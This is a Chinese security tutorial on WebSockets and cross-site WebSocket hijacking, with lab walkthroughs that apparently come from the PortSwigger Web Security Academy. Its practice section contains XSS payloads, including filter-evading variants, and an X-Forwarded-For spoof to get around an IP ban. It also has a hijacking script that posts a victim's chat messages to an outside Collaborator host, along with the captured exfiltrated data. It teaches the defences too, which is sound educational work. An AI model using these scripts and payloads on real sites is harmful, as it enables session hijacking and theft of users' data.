---
title: WebSocket协议
img: 'https://bigworldxld.github.io/picx-images-hosting/images/WebSocket协议.webp'
categories: tools
tags:
  - WebSocket
  - CSWSH
abbrlink: 60745
date: 2024-11-03 20:38:25
---
## CORS

Access-Control-Allow-Origin是HTTP头部的一部分，用于实现跨域资源共享(CORS, Cross-Origin Resource Sharing)。当一个网页尝试从与自身来源不同的服务器上获取资源时，浏览器会实施同源策略，阻止这种请求，除非服务器明确许可这种跨域访问。Access-Control-Allow-Origin头就是服务器用来告知浏览器哪些网站可以访问其资源的一种方式

## CSWSH漏洞

即跨站WebSocket劫持漏洞（Cross-site WebSocket Hijacking），是一种全能型CSRF（可读、可写）的漏洞类型

漏洞概述

定义：CSWSH漏洞是指当WebSocket握手请求仅依赖HTTP cookie进行会话处理，并且没有CSRF令牌时，攻击者可以在自己构建一个恶意连接，对应用程序建立跨站点WebSocket连接，随后受害者将会与应用程序的会话上下文中处理连接，随之连接向服务器发送任意消息，并读取从服务器收到的消息内容。
特点：攻击者获得与受感染应用程序的双向交互能力，伪装成受害用户做敏感操作，被劫持的应用程序可以进行双向交互。
漏洞产生

WebSocket握手无验证：建立WebSocket连接时通常无验证，例如篡改Origin头，可以发现没有对Origin进行验证，从而允许跨域进行协议升级。
CSRF令牌缺失：当WebSocket握手请求仅依赖HTTP cookie进行会话处理，并且没有包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。
漏洞利用

伪造身份：攻击者可以通过恶意网页伪装用户的身份，与服务器建立WebSocket连接。
执行未授权操作：攻击者通过WebSocket通道执行一些敏感操作，如修改密码等。
检索敏感数据：攻击者拦截并记录从服务器发送到客户端的敏感数据。
防范措施

校验Origin头：确保只有来自可信来源的请求才能建立WebSocket连接。
双向不信任：将WebSocket传输数据视为不可信，避免直接使用未经验证的数据。
加密保护：对WebSocket握手信息进行加密保护，防止信息泄露。
硬编码URL：硬编码WebSockets终结点的URL，减少被篡改的风险

## WebSockets

WebSockets 是通过 HTTP 启动的双向全双工通信协议。它们通常用于现代 Web 应用程序中的流数据和其他异步流量。

**HTTP 和 WebSockets 区别**

使用 HTTP 时，客户端发送请求，服务器返回响应。通常，响应会立即发生，并且事务已完成。

WebSocket 连接是通过 HTTP 启动的，并且通常很长。消息可以随时向任一方向发送，并且本质上不是事务性的。连接通常会保持打开和空闲状态，直到客户端或服务器准备好发送消息。

WebSockets 在需要低延迟或服务器启动的消息的情况下特别有用，例如财务数据的实时馈送。

**WebSocket 连接建立**

WebSocket 连接通常使用客户端 JavaScript 创建，如下所示：

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

wss该协议通过加密的 TLS 连接建立 WebSocket，而ws协议使用未加密的连接

浏览器和服务器通过 HTTP 执行 WebSocket 握手。浏览器发出 WebSocket 握手请求，如下所示：

```http
GET /chat HTTP/1.1 
Host: normal-website.com 
Sec-WebSocket-Version: 13 
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== 
Connection: keep-alive, Upgrade 
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 
Upgrade: websocket
```

如果服务器接受连接，它将返回 WebSocket 握手响应，如下所示：

```http
HTTP/1.1 101 Switching Protocols 
Connection: Upgrade 
Upgrade: websocket 
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

此时，网络连接保持打开状态，可用于向任一方向发送 WebSocket 消息

WebSocket 握手消息的几个功能：

- 请求和响应中的Connection and Upgrade标头表示这是一次 WebSocket 握手。
- 请求标头指定客户端希望使用的 WebSocket 协议版本。这通常是 .`Sec-WebSocket-Version:13`
- 请求标头包含一个 Base64 编码的随机值，该值应在每个握手请求中随机生成。`Sec-WebSocket-Key`
- 响应标头Sec-WebSocket-Accept包含在请求标头Sec-WebSocket-Key中提交的值的哈希值，该哈希值与协议规范中定义的特定字符串连接。这样做是为了防止因服务器配置错误或缓存代理而导致的误导性响应

**WebSocket 消息**

使用客户端 JavaScript 从浏览器发送一条简单的消息，如下所示：

```javascript
ws.send("Peter Wiener");
```

原则上，WebSocket 消息可以包含任何内容或数据格式。在现代应用程序中，通常使用 JSON 在 WebSocket 消息中发送结构化数据

**操纵 WebSocket 流量**

拦截和修改 WebSocket 消息

重播和生成新的 WebSocket 消息

需要处理 WebSocket 握手：

- 它可以使你能够到达更多的攻击面。
- 某些攻击可能会导致您的连接断开，因此您需要建立新的连接。
- 原始握手请求中的令牌或其他数据可能已过时，需要更新

任何与 WebSockets 相关的 Web 安全漏洞都可能出现：

- 传输到服务器的用户提供的输入可能会以不安全的方式进行处理，从而导致 SQL 注入或 XML 外部实体注入等漏洞。
- 通过 WebSockets 访问的某些盲漏洞可能只能使用带外 （OAST） 技术检测到。
- 如果攻击者控制的数据通过 WebSockets 传输给其他应用程序用户，则可能会导致 XSS 或其他客户端漏洞



错误地信任 HTTP 标头来执行安全决策，例如标头。`X-Forwarded-For`

会话处理机制中的缺陷，因为处理 WebSocket 消息的会话上下文通常由握手消息的会话上下文决定。

应用程序使用的自定义 HTTP 标头引入的攻击面

降低 WebSockets 出现安全漏洞的风险，请使用以下准则：

- 使用协议 （WebSockets over TLS）。`wss://`
- 对 WebSockets 端点的 URL 进行硬编码，当然不要将用户可控制的数据合并到此 URL 中。
- 保护 WebSocket 握手消息免受 CSRF 攻击，以避免跨站 WebSockets 劫持漏洞。
- 将通过 WebSocket 接收的数据在两个方向上都视为不受信任。在服务器端和客户端安全地处理数据，以防止基于输入的漏洞，例如 SQL 注入和跨站点脚本。

## 实践

1: 操纵 WebSocket 消息以利用漏洞
使用拦截器，修改内容触发xss
<img src=1 onerror=\"alert(1)\">
2:跨站点 WebSocket 劫持

```javascript
<script>	
    var ws = new WebSocket('wss://0a3000eb03e0167e84e2b3ed002c00d8.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://gsc3wtb2gzww9im1j5em1uopzg5at0hp.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

存储和查看漏洞
Collaborator 选项卡，然后单击 Poll now 。请注意，您收到了许多新的交互，其中包含您的整个聊天历史记录
在http请求中找到如下：

POST / HTTP/1.1
Host: gsc3wtb2gzww9im1j5em1uopzg5at0hp.oastify.com
Connection: keep-alive
Content-Length: 82
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://exploit-0aca009803441663840fb2a4010a00ff.exploit-server.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://exploit-0aca009803441663840fb2a4010a00ff.exploit-server.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9

{"user":"Hal Pline","content":"No problem carlos, it&apos;s swoipm0y0gei7l4sw9nq"}

3:操纵 WebSocket 握手以利用漏洞
发送聊天消息。
观察聊天消息是否已通过 WebSocket 消息发送。
Repeater中编辑并重新发送包含基本 XSS 有效负载的消息，例如：
`<img src=1 onerror='alert(1)'>`
注意，攻击已被阻止，并且您的 WebSocket 连接已终止。
点击 “Reconnect”，并观察连接尝试失败，因为您的 IP 地址已被禁止。
在GET /chat HTTP/1.1的请求头中加入
X-Forwarded-For: 1.1.1.1
显示连接成功，继续修改，发送包含混淆 XSS 有效负载的 WebSocket 消息

```html
<iframe src='jAvAsCripT:alert`1`'></iframe>或者
<img src=1 oNeRrOr=alert`1`>
```